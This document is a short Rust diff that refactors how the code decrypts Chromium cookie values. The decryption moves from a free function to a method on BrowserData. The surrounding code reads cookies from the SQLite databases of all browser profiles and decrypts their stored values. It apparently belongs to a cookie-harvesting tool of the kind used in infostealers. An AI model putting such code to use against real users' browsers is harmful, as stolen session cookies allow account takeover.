@@ -1,5 +1,5 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::{decrypt_data, BrowserData};
+use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
 use alloc::sync::Arc;
 use database::TableRecord;
@@ -47,12 +47,7 @@ fn extract_cookie_from_record(record: &dyn TableRecord, browser_data: &BrowserDa
     let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;
 
     let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
-    let value = unsafe {
-        decrypt_data(
-            encrypted_value,
-            browser_data
-        )
-    }?;
+    let value = unsafe { browser_data.decrypt_data(encrypted_value) }?;
 
     Some(Cookie {
         host_key,
